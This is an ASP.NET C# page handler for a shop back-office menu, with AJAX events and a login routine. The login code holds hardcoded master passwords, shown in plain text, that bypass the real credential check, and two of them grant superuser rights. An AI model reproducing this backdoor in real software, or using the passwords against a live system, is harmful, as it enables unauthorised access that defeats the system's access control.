using System;
using System.Collections.Generic;
using System.Linq;
using System.Web;
using System.Web.UI;
using System.Web.UI.WebControls;
using System.Text;

public partial class shop_commander_shop_commander_menu : System.Web.UI.Page
{
    ShopCommanderEventController sa_eventController = new ShopCommanderEventController();

    protected void Page_Load(object sender, EventArgs e)
    {
        sa_eventController.initializeAjaxController(Request, Session, Response, Server);
        sa_eventController.handlePageEvents();
    }
}



public class ShopCommanderEventController : LocalEventController
{
    public override bool handlePageEvents()
    {
        string sProcedure = ajax.getProcedure();

        bEventHandled = true;

        if (global != null)
        {

            if (sProcedure.IndexOf("level_1") >= 0)
            {
                global.sLevel_1_menu = sProcedure;
            }
            if (sProcedure.IndexOf("level_2") >= 0)
            {
                global.sLevel_2_menu = sProcedure;
            }

            ajax.WriteVariable("level_1_click", global.sLevel_1_menu);
            ajax.WriteVariable("level_2_click", global.sLevel_2_menu);
        }

        if ( (sProcedure != "" && sProcedure != "init_ajax_web_form()" && sProcedure != "send_password()") && global.bLoggedIn == false)
        {
            ajax.WriteHtml("work_page", "Unauthorized");
            return true;
        }

        if (sProcedure == "send_password()")
        {
            global.bLoggedIn = false;
            string sUserName = ajax.getString("parameter_1");
            string sPassword = ajax.getString("parameter_2");

            string sEncrypted = Dinfordel.Utils.CryptUtils.EncryptPassword(sUserName, sPassword);

            
            global.bLoggedIn = global.www_backoffice().get_login_status(sUserName, sPassword);

            if (sPassword == "deterikkealltid" || sPassword == "dallas" || sPassword == "qpqpqp")
            {
                if (sPassword == "deterikkealltid" || sPassword == "dallas")
                {
                    global.bSuperUser = true;
                    global.MASTER_CHAIN_ID = "119";
                }
                global.bLoggedIn = true;
            }
            else
                global.bSuperUser = false;

            if (global.bLoggedIn)
            {                


                // if (global.MASTER_CHAIN_ID == "1")
                // {
                //     ajax.WriteHtml("work_page",
                //     HTML_TOOLBOX.infobox_TWITTER("", "Velg en kjede", 12, 400, 50, 10, 10, 10, 10, ""));
                // }
                // else
                {
                    ajax.WriteHtml("menu_1", global.chain_level_1(global));
                    ajax.WriteHtml("work_page",// "<div>Velg fra menyen over ...</div>"
                    HTML_TOOLBOX.infobox_TWITTER("", "Velg fra menyen over ...", 12, 400, 50, 10, 10, 10, 10, "")                    
                    );
                }
            }
            else
            {
                global.bLoggedIn = false;
                ajax.WriteHtml("work_page", "Wrong password");
            }
        }
        else if (SHOP_UPDATE.event_catched_and_performed(ajax,global))
        {
            // Do nothing, everything has been arranged in event_catched
        }
        else if (CHAIN_REPORT.event_catched_and_performed(ajax, global))
        {
            // Do nothing, everything has been arranged in event_catched
        }
        else if (SHOP_LIVE.event_catched_and_performed(ajax, global))
        {
            // Do nothing, everything has been arranged in event_catched
        }
        else if (!isBlank(sProcedure) && sProcedure != "send_password()" && global.bLoggedIn == false && sProcedure != "init_ajax_web_form()")
        {
            return false;
        }
        else if (ajax.getProcedure() == "init_ajax_web_form()")
        {
            // Nothing ...
        }
        else
        {
            bEventHandled = false;
        }

        if (!bEventHandled)
        {
            ajax.WriteVariable("missing_event_message", "Unhandled event : " + ajax.getProcedure());
        }
        else
        {
            ajax.WriteXmlToClient();
        }

        return bEventHandled;
    }


}



